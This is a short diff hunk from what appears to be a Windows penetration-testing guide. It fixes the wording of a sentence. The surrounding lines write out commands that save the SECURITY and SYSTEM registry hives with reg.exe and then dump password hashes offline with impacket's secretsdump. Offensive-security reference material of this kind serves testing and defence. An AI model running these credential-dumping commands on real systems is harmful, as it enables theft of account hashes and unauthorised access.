@@ -136,7 +136,7 @@ reg.exe save hklm\security c:\temp\security.save
 reg.exe save hklm\system c:\temp\system.save
 ```
 
-After obtaining the hashes can be dumped using secretsdump from impacket.
+After obtaining the hives the hashes can be dumped using secretsdump from impacket.
 ```
 secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
 ```
